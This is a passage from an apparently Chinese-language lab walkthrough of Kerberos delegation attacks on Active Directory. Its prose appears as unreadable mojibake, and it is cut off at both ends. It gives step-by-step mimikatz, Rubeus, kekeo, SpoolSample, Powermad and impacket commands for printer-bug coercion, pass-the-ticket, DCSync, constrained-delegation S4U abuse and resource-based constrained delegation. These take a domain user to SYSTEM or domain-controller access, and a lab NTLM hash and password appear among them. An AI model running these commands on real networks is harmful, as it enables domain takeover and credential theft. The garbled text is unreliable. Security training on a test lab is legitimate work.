†ç¥¨æ®ï¼Œå¯ä»¥å‘ç°å…¶ä¸­å°±æœ‰æˆ‘ä»¬æ‰€éœ€è¦çš„åŸŸç®¡ç¥¨æ®ï¼Œå…ˆå°è¯•è¿æ¥åŸŸæ§</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\dc01.chu0.<span class="built_in">time</span>\c$</span><br></pre></td></tr></table></figure><p>è¯·æ±‚å¤±è´¥</p><p><img src="../ç¬”è®°å›¾/image-20240906221007079.png" alt="image-20240906221007079"></p><p>å¯¼å…¥ç¥¨æ®ç„¶åå†å°è¯•è®¿é—®åŸŸæ§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptt [0;95acd]-2-0-60a10000-Administrator@krbtgt-CHU0.TIME.kirbi&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> \\dc01.chu0.time\c$</span><br></pre></td></tr></table></figure><p>è®¿é—®æˆåŠŸ</p><p><img src="../ç¬”è®°å›¾/image-20240906221124597.png" alt="image-20240906221124597"></p><h3 id="å¼ºåˆ¶è®¿é—®æ¼æ´åˆ©ç”¨"><a href="#å¼ºåˆ¶è®¿é—®æ¼æ´åˆ©ç”¨" class="headerlink" title="å¼ºåˆ¶è®¿é—®æ¼æ´åˆ©ç”¨"></a>å¼ºåˆ¶è®¿é—®æ¼æ´åˆ©ç”¨</h3><p><strong>åˆ©ç”¨æ¡ä»¶</strong></p><ul><li>éœ€è¦ç®¡ç†å‘˜æƒé™</li></ul><p>åšè¿‡äº‘é•œçš„å¸ˆå‚…å¯¹è¿™ä¸ªæ“ä½œåº”è¯¥éƒ½ä¸é™Œç”Ÿäº†ï¼Œä¸é’“é±¼ä¸åŒï¼Œåˆ©ç”¨å¼ºåˆ¶è®¿é—®æ¼æ´å¯ä»¥å¼ºåˆ¶åŸŸç®¡è®¿é—®WEB2016ï¼Œè¿›è€Œç•™ä¸‹TGTã€‚</p><p>å…ˆåˆ©ç”¨Rubeuså¼€å¯ç›‘å¬ï¼Œè·å–çš„b64çš„TGTä¼šå†™åˆ°hash.txté‡Œé¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:2 /filteruser:DC01$ &gt; hash.txt</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ‰“å°æœºæ¼æ´å¼ºåˆ¶åŸŸç®¡è®¿é—®WEB2016</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spoolsample.exe DC01 WEB2016</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240906221906164.png" alt="image-20240906221906164"></p><p><img src="../ç¬”è®°å›¾/image-20240906221924409.png" alt="image-20240906221924409"></p><p>å°†TGTç¥¨æ®å¯¼å…¥å†…å­˜ï¼Œç„¶åDcsyncå³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:b64ç¥¨æ®</span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:chu0.time /all /csv&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="äºŒã€çº¦æŸæ€§å§”æ´¾"><a href="#äºŒã€çº¦æŸæ€§å§”æ´¾" class="headerlink" title="äºŒã€çº¦æŸæ€§å§”æ´¾"></a>äºŒã€çº¦æŸæ€§å§”æ´¾</h2><p>ç”±äºéçº¦æŸæ€§å§”æ´¾çš„ä¸å®‰å…¨æ€§ï¼Œå¾®è½¯æå‡ºäº†çº¦æŸæ€§å§”æ´¾ï¼Œå…¶è¦æ±‚æœºå™¨åªèƒ½å§”æ´¾æŒ‡å®šçš„æŸäº›æœåŠ¡ï¼Œè€Œä¸èƒ½å§”æ´¾ä»»æ„æœåŠ¡ã€‚æ‰€ä»¥è¯´çº¦æŸæ€§å§”æ´¾æ”»å‡»çš„å±å®³è¿˜æ˜¯å–å†³äºè®¾ç½®äº†å¯è¢«å§”æ´¾çš„æœåŠ¡çš„æƒé™é«˜ä½ã€‚çº¦æŸæ€§å§”æ´¾çš„ä¸»è¦ç›®çš„æ˜¯ä»¥ä»»æ„ç”¨æˆ·èº«ä»½è·å–æŸæœåŠ¡çš„STï¼Œè€Œåœ¨è·å–ç‰¹å®šæœåŠ¡çš„STä¹‹å‰éœ€è¦å…ˆè·å–è‡ªèº«çš„STï¼Œè¿™ä¸¤æ­¥æ“ä½œå°±æ¶‰åŠåˆ°äº†S4u2selfï¼ˆService for User to Selfï¼‰å’Œ S4U2proxyï¼ˆService for User to Proxyï¼‰è¿™ä¸¤ä¸ªæ‹“å±•åè®®ã€‚S4u2selfåè®®å¯ä»¥ä»£è¡¨ä»»æ„ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªè‡ªèº«çš„STï¼ˆå¯è½¬å‘çš„ï¼‰ï¼ŒS4U2proxyåè®®åˆ™å¯ä»¥å°†selfä¸­è·å–çš„STï¼ˆä»»æ„ç”¨æˆ·ï¼‰è½¬å‘ç»™å…¶ä»–æœåŠ¡ï¼ˆè®¾ç½®äº†å§”æ´¾ï¼‰ï¼Œä»¥ä»»æ„ç”¨æˆ·èº«ä»½è·å–å¯è¢«å§”æ´¾çš„æœåŠ¡æƒé™ã€‚</p><h3 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>é€‰æ‹©â€œä¿¡ä»»æ­¤è®¡ç®—æœºæ¥å§”æ´¾æŒ‡å®šçš„æœåŠ¡â€ - â€œä½¿ç”¨ä»»ä½•èº«ä»½éªŒè¯åè®®â€ï¼Œåœ¨ä¸‹é¢é€‰æ‹©DCçš„cifsæˆ–è€…ldapæœåŠ¡å³å¯</p><p><img src="../ç¬”è®°å›¾/image-20240906232018441.png" alt="image-20240906232018441"></p><h3 id="æ¼æ´å‘ç°-1"><a href="#æ¼æ´å‘ç°-1" class="headerlink" title="æ¼æ´å‘ç°"></a>æ¼æ´å‘ç°</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># AdFind.exeæŸ¥è¯¢çº¦æŸå§”æ´¾æœºå™¨è´¦æˆ·</span></span><br><span class="line">AdFind.exe -b <span class="string">&quot;DC=chu0,DC=time&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line"><span class="comment"># AdFind.exeæŸ¥è¯¢çº¦æŸå§”æ´¾æœåŠ¡è´¦æˆ·</span></span><br><span class="line">AdFind.exe -b <span class="string">&quot;DC=chu0,DC=time&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨æ–¹å¼ä¸€"><a href="#åˆ©ç”¨æ–¹å¼ä¸€" class="headerlink" title="åˆ©ç”¨æ–¹å¼ä¸€"></a>åˆ©ç”¨æ–¹å¼ä¸€</h3><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>è·å–ç®¡ç†å‘˜æƒé™</li><li>è¢«æ§æœºå™¨è®¾ç½®äº†çº¦æŸæ€§å§”æ´¾</li><li>å¯è·å–è¢«æ§æœºå™¨è´¦æˆ·ç¥¨æ®</li></ul><p>å¯¼å‡ºç¥¨æ®ï¼ˆå³è·å–è‡ªèº«æœåŠ¡ç¥¨æ®ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907114123238.png" alt="image-20240907114123238"></p><p>å°†ç¥¨æ®è½¬å‘ï¼Œå¹¶ä»¥åŸŸç®¡æƒé™è·å–ç›®æ ‡æœåŠ¡ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe <span class="string">&quot;tgs::s4u /tgt:[0;3e4]-2-1-40e10000-WIN2016CD<span class="variable">$@krbtgt</span>-CHU0.TIME.kirbi /user:Administrator@chu0.time /service:cifs/DC01.chu0.</span></span><br><span class="line"><span class="string">time&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907114342458.png" alt="image-20240907114342458"></p><p>å…ˆå°è¯•è¿æ¥</p><p><img src="../ç¬”è®°å›¾/image-20240907114410878.png" alt="image-20240907114410878"></p><p>å¯¼å…¥ç¥¨æ®åå†å°è¯•è¿æ¥ï¼Œå³å¯å‘ç°åˆ©ç”¨æˆåŠŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptt TGS_Administrator@chu0.time@CHU0.TIME_cifs~DC01.chu0.time@CHU0.TIME.kirbi&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907114520570.png" alt="image-20240907114520570"></p><h3 id="åˆ©ç”¨æ–¹å¼äºŒ"><a href="#åˆ©ç”¨æ–¹å¼äºŒ" class="headerlink" title="åˆ©ç”¨æ–¹å¼äºŒ"></a>åˆ©ç”¨æ–¹å¼äºŒ</h3><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>è·å–ç®¡ç†å‘˜æƒé™</li><li>è¢«æ§æœºå™¨è®¾ç½®äº†çº¦æŸæ€§å§”æ´¾</li><li>å¯è·å–è¢«æ§æœºå™¨è´¦æˆ·å“ˆå¸Œ</li></ul><p>è·å–è¢«æ§æœºå™¨è´¦æˆ·å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907115056751.png" alt="image-20240907115056751"></p><p>ç”³è¯·è‡ªèº«çš„å¯è½¬å‘ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:WIN2016CD$ /rc4:8338370cc068216eec4d5712b200f5d6 /domain:chu0.time /dc:DC01.chu0.time /nowrap</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907115210029.png" alt="image-20240907115210029"></p><p>åˆ©ç”¨s4uåè®®è·å–ç›®æ ‡æœåŠ¡ç¥¨æ®åè¿æ¥åŸŸæ§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/DC01.chu0.time /dc:DC01.chu0.time /ptt /ticket:b64ç¥¨æ®</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907115545492.png" alt="image-20240907115545492"></p><h3 id="åˆ©ç”¨æ–¹å¼ä¸‰"><a href="#åˆ©ç”¨æ–¹å¼ä¸‰" class="headerlink" title="åˆ©ç”¨æ–¹å¼ä¸‰"></a>åˆ©ç”¨æ–¹å¼ä¸‰</h3><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>è·å–ç®¡ç†å‘˜æƒé™</li><li>è¢«æ§æœºå™¨è®¾ç½®äº†çº¦æŸæ€§å§”æ´¾</li><li>å¯è·å–è¢«æ§æœºå™¨è´¦æˆ·å“ˆå¸Œ</li></ul><p>è·å–è¢«æ§æœºå™¨è´¦æˆ·å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è·å–çš„å“ˆå¸Œç”³è¯·ç›®æ ‡æœåŠ¡çš„åŸŸç®¡æƒé™ç¥¨æ®ï¼Œå†ä½¿ç”¨æ¨ªå‘æ‰‹æ®µè¿æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST -dc-ip 192.168.139.160 -spn cifs/DC01.chu0.time -impersonate administrator chu0.time/WIN2016CD$ -hashes :8338370cc068216eec4d5712b200f5d6</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907120302487.png" alt="image-20240907120302487"></p><p>å°†ç¥¨æ®å¯¼å…¥å†…å­˜ï¼Œæ¨ªå‘åŸŸæ§å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¯¼å…¥ç¥¨æ®</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator@cifs_DC01.chu0.time@CHU0.TIME.ccache</span><br><span class="line"><span class="comment">#æ¨ªå‘åŸŸæ§</span></span><br><span class="line">impacket-wmiexec -k chu0.time/administrator@DC01.chu0.time -no-pass -dc-ip 192.168.139.160</span><br><span class="line">impacket-smbexec -k chu0.time/administrator@DC01.chu0.time -no-pass -dc-ip 192.168.139.160</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨æ–¹å¼å››"><a href="#åˆ©ç”¨æ–¹å¼å››" class="headerlink" title="åˆ©ç”¨æ–¹å¼å››"></a>åˆ©ç”¨æ–¹å¼å››</h3><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>è·å–ç®¡ç†å‘˜æƒé™</li><li>è¢«æ§æœºå™¨è®¾ç½®äº†çº¦æŸæ€§å§”æ´¾</li><li>å¯è·å–è¢«æ§æœºå™¨è´¦æˆ·å“ˆå¸Œ</li></ul><p>åˆ©ç”¨å“ˆå¸Œç”³è¯·ç¥¨æ®ï¼Œè€Œä¸æ˜¯ç›´æ¥å¯¼å‡º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe <span class="string">&quot;tgt::ask /user:WIN2016CD$ /domain:chu0.time /NTLM:8338370cc068216eec4d5712b200f5d6&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907121042419.png" alt="image-20240907121042419"></p><p>åˆ©ç”¨å¯è½¬å‘ç¥¨æ®ç”³è¯·ç‰¹å®šæœåŠ¡ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe <span class="string">&quot;tgs::s4u /tgt:TGT_WIN2016CD<span class="variable">$@CHU0</span>.TIME_krbtgt~chu0.time@CHU0.TIME.kirbi /user:Administrator@chu0.time /service:cifs/DC01.chu0.time&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907121146906.png" alt="image-20240907121146906"></p><p>å¯¼å…¥ç¥¨æ®ï¼Œè¿æ¥DC</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptt TGS_Administrator@chu0.time@CHU0.TIME_cifs~DC01.chu0.time@CHU0.TIME.kirbi&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> \\DC01.chu0.time\c$</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾"><a href="#ä¸‰ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾" class="headerlink" title="ä¸‰ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾"></a>ä¸‰ã€åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾</h2><p>åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾å¯ä»¥ç†è§£ä¸ºçº¦æŸæ€§å§”æ´¾çš„å‡çº§ç‰ˆï¼Œåœ¨çº¦æŸæ€§å§”æ´¾ä¸­ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®è¢«æ§ä¸»æœºçš„msDS-AllowedToDelegateToæ¥æŒ‡å®šå…¶å¯ä»¥å§”æ´¾çš„æœåŠ¡ï¼Œè€Œåœ¨åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç›®æ ‡æœºå™¨ä¸Šè®¾ç½®msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§æ¥æŒ‡å®šå¯ä»¥å§”æ´¾ç›®æ ‡æœºå™¨æœåŠ¡çš„æœºå™¨ã€‚æ¼æ´åˆ©ç”¨è¿‡ç¨‹å°±æ˜¯åœ¨çº¦æŸæ€§å§”æ´¾æ”»å‡»ä¹‹å‰å¢åŠ ä¸€ä¸ªè®¾ç½®msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§çš„è¿‡ç¨‹ã€‚</p><h3 id="æœ¬åœ°ææƒ"><a href="#æœ¬åœ°ææƒ" class="headerlink" title="æœ¬åœ°ææƒ"></a>æœ¬åœ°ææƒ</h3><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>æ‹¥æœ‰å½“å‰æœºå™¨åŸŸç”¨æˆ·æƒé™</li><li>åŸŸç”¨æˆ·MAQå€¼ä¸ä¸º0</li></ul><p>æŸ¥çœ‹å°†æœºå™¨åŠ å…¥åŸŸçš„ç”¨æˆ·çš„sidï¼Œå†é€šè¿‡sidåæŸ¥å‡ºå¯¹åº”çš„ç”¨æˆ·å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è·å–SID</span></span><br><span class="line">AdFind.exe -b <span class="string">&quot;DC=chu0,DC=time&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369))&quot;</span> cn mS-DS-CreatorSID</span><br><span class="line"><span class="comment">#åæŸ¥ç”¨æˆ·å</span></span><br><span class="line">sid2user.exe \\192.168.139.160 5 21 1075071014 1600225418 2883514341 1108</span><br><span class="line"><span class="comment">#æˆ–è€…</span></span><br><span class="line">AdFind.exe -b <span class="string">&quot;DC=chu0,DC=time&quot;</span> -f <span class="string">&quot;(&amp;(objectsid=S-1-5-21-1075071014-1600225418-2883514341-1108))&quot;</span> objectclass cn dn</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907133200448.png" alt="image-20240907133200448"></p><p><img src="../ç¬”è®°å›¾/image-20240907133236502.png" alt="image-20240907133236502"></p><p>ç°åœ¨çœ‹æ¥ï¼Œæ‰€æœ‰çš„æ¡ä»¶å°±éƒ½æ»¡è¶³äº†ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯¼å…¥æ¨¡å—</span></span><br><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line"><span class="comment"># è®¾ç½®æœºå™¨è´¦æˆ·çš„å¯†ç </span></span><br><span class="line"><span class="variable">$Password</span> = ConvertTo-SecureString <span class="string">&#x27;whoami@666&#x27;</span> -AsPlainText -Force</span><br><span class="line"><span class="comment"># é€šè¿‡ New-MachineAccount å‡½æ•°åˆ›å»ºæœºå™¨è´¦æˆ·</span></span><br><span class="line">New-MachineAccount -MachineAccount <span class="string">&quot;hacker&quot;</span> -Password $(<span class="variable">$Password</span>) -Domain <span class="string">&quot;chu0.time&quot;</span> -DomainController <span class="string">&quot;DC01.chu0.time&quot;</span> -Verbose</span><br><span class="line"></span><br><span class="line"><span class="comment">#æˆ–è€…ä½¿ç”¨impacketè„šæœ¬åˆ›å»º</span></span><br><span class="line">python3 addcomputer.py chu0.time/RBCDhacker:<span class="built_in">whoami</span>@666 -method LDAPS -computer-name hacker\$ -computer-pass <span class="built_in">whoami</span>@666 -dc-ip 192.168.139.160</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907135010099.png" alt="image-20240907135010099"></p><p>å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹æ˜¯å¦åˆ›å»ºæˆåŠŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;Domain Computers&quot;</span> /domain</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907135036089.png" alt="image-20240907135036089"></p><p>åœ¨åŸŸç®¡å¤„ä¹Ÿå¯ä»¥çœ‹åˆ°</p><p><img src="../ç¬”è®°å›¾/image-20240907140343646.png" alt="image-20240907140343646"></p><p>æŸ¥çœ‹æ–°æœºå™¨è´¦æˆ·çš„sid</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1;Get-NetComputer hacker -Properties objectsid</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907140233823.png" alt="image-20240907140233823"></p><p>å°†æœ¬æœºçš„msDS-AllowedToActOnBehalfOfOtherIdentityè®¾ç½®ä¸ºåˆšåˆšåˆ›å»ºçš„æœºå™¨è´¦æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\powerview.ps1;<span class="variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1075071014-1600225418-2883514341-1111)&quot;</span>;<span class="variable">$SDBytes</span> = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength);<span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, 0);Get-DomainComputer WIN2016RBCD| Set-DomainObject -Set @&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; -Verbose </span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907140543446.png" alt="image-20240907140543446"></p><p>æ£€æŸ¥æ˜¯å¦é…ç½®æˆåŠŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer WIN2016RBCD -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907140738905.png" alt="image-20240907140738905"></p><p>åˆ©ç”¨åˆšåˆ›å»ºçš„hackerè´¦æˆ·ç”³è¯·WEB2016RBCDæœºå™¨çš„STç¥¨æ®åï¼Œå¯¼å…¥ç¥¨æ®ï¼Œæ— å¯†ç ç™»å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç”³è¯·ç¥¨æ®</span></span><br><span class="line">impacket-getST chu0.time/hacker$:<span class="built_in">whoami</span>@666 -spn cifs/WIN2016RBCD.chu0.time -impersonate administrator -dc-ip 192.168.139.160</span><br><span class="line"><span class="comment">#å¯¼å…¥ç¥¨æ®</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator@cifs_WIN2016RBCD.chu0.time@CHU0.TIME.ccache</span><br><span class="line"><span class="comment">#æ— å¯†ç è¿æ¥</span></span><br><span class="line">impacket-smbexec -k chu0.time/administrator@WIN2016RBCD.chu0.time -no-pass -dc-ip 192.168.139.160</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907141606854.png" alt="image-20240907141606854"></p><p><img src="../ç¬”è®°å›¾/image-20240907141625621.png" alt="image-20240907141625621"></p><p>å¯ä»¥å‘ç°æˆ‘ä»¬ç°åœ¨çš„æƒé™å°±ä»åŸŸç”¨æˆ·æƒé™æå‡åˆ°systemæƒé™äº†ã€‚</p><h3 id="åˆ©ç”¨RBCDæ¨ªå‘"><a href="#åˆ©ç”¨RBCDæ¨ªå‘" class="headerlink" title="åˆ©ç”¨RBCDæ¨ªå‘"></a>åˆ©ç”¨RBCDæ¨ªå‘</h3><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>æ‹¥æœ‰å½“å‰æœºå™¨åŸŸç”¨æˆ·æƒé™</li><li>åŸŸç”¨æˆ·MAQå€¼ä¸ä¸º0</li><li>æœ‰å¤šå°æœºå™¨ä½¿ç”¨åŒä¸€åŸŸç”¨æˆ·åŠ å…¥åŸŸ</li></ul><p>å›åˆ°ä¸Šé¢è¿™å¼ å›¾</p><p><img src="../ç¬”è®°å›¾/image-20240907133200448.png" alt="image-20240907133200448"></p><p>è§£é‡Šä¸€ä¸‹æ¡ä»¶ä¸‰ï¼Œä»å›¾ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°æœºå™¨WIN2016RBCDå’ŒWIN-E5O87N3AMQIåŠ å…¥åŸŸçš„ç”¨æˆ·çš„SIDå€¼ä¸€æ ·ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¿©æœºå™¨éƒ½æ˜¯ç”¨RBCDhackerè´¦æˆ·åŠ åŠ å…¥çš„åŸŸã€‚æ­¤åˆ©ç”¨ä¸æœ¬åœ°ææƒè¿‡ç¨‹åŸºæœ¬ç›¸åŒï¼Œåªæ˜¯åœ¨è®¾ç½®msDS-AllowedToActOnBehalfOfOtherIdentityçš„å±æ€§æ—¶è®¾ç½®çš„æ˜¯å…¶ä»–æœºå™¨çš„msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\powerview.ps1;<span class="variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1075071014-1600225418-2883514341-1111)&quot;</span>;<span class="variable">$SDBytes</span> = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength);<span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, 0);Get-DomainComputer WIN-E5O87N3AMQI| Set-DomainObject -Set @&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; -Verbose </span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å¯¹åº”å±æ€§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer WIN-E5O87N3AMQI -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240907142522023.png" alt="image-20240907142522023"></p><p>å‰©ä¸‹çš„æ­¥éª¤å°±å’Œä¹‹å‰ä¸€æ ·äº†ï¼Œä¸­é—´æœ‰ä¸¤æ¬¡å¤±è´¥æ˜¯å› ä¸ºé˜²ç«å¢™å¿˜å…³äº†</p><p><img src="../ç¬”è®°å›¾/image-20240907142843560.png" alt="image-20240907142843560"></p><h3 id="åˆ©ç”¨AOç»„ç”¨æˆ·æ¨ªå‘"><a href="#åˆ©ç”¨AOç»„ç”¨æˆ·æ¨ªå‘" class="headerlink" title="åˆ©ç”¨AOç»„ç”¨æˆ·æ¨ªå‘"></a>åˆ©ç”¨AOç»„ç”¨æˆ·æ¨ªå‘</h3><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>è·å–åˆ°å±äºAcount Operatorsç»„çš„ç”¨æˆ·æƒé™</li><li>æ­¤ç”¨æˆ·å¯ä»¥åˆ›å»ºæœºå™¨è´¦æˆ·ï¼ˆMAQä¸ä¸º0ï¼‰</li></ul><p>å…ˆå‘Acount Operatorsç»„é‡Œé¢åŠ 